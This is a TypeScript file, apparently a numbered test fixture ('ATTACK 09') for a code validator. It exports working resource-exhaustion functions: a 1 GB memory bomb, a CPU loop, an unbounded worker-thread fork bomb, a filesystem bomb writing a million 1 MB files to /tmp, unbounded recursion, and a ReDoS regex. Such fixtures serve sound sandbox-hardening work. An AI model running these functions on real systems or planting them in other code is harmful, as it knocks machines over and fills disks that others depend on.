// ATTACK 09: Resource Exhaustion
// Goal: Cause memory/CPU exhaustion during validation

// Memory bomb - exponential string growth
export function memoryBomb(): string {
  let s = 'x'
  for (let i = 0; i < 30; i++) {
    s = s + s  // 2^30 = 1GB string
  }
  return s
}

// CPU bomb - expensive computation
export function cpuBomb(): number {
  let result = 0
  for (let i = 0; i < 1e10; i++) {
    result += Math.sin(i) * Math.cos(i)
  }
  return result
}

// Fork bomb via worker threads
export function forkBomb(): void {
  const { Worker } = require('worker_threads')
  while (true) {
    new Worker(__filename)
  }
}

// File system bomb
export function fsBomb(): void {
  const fs = require('fs')
  for (let i = 0; i < 1e6; i++) {
    fs.writeFileSync(`/tmp/bomb_${i}.txt`, 'x'.repeat(1e6))
  }
}

// Infinite recursion
export function stackBomb(n: number = 0): number {
  return stackBomb(n + 1)
}

// Regex bomb (ReDoS)
export function regexBomb(input: string): boolean {
  // Evil regex that causes catastrophic backtracking
  const evil = /^(a+)+$/
  return evil.test(input)
}

export function helper() { return 1 }
